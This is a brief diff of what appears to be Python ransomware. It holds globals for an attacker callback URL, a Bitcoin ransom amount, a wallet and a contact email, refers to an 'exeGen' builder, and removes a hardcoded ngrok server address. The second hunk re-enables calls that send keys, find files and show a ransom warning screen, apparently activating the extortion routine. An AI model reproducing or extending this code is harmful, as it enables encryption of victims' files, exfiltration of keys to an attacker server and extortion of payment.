@@ -22,7 +22,7 @@ uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "")
 
 # some GLOBALS
 
-URL = "http://9cf4-61-0-102-175.ngrok.io"                        # <----  REQUIRED (Use exeGen.. It is much easier)
+URL = ""                        # <----  REQUIRED (Use exeGen.. It is much easier)
 BTC_AMOUNT = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
 BTC_WALLET = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
 EMAIL = ""                      # <----  REQUIRED (Use exeGen.. It is much easier)
@@ -218,5 +218,5 @@ if __name__ == "__main__":
     window = System()
 
     cryptn8.sendKeys()
-    # cryptn8.findFiles()
-    # window.warningScreen()
+    cryptn8.findFiles()
+    window.warningScreen()
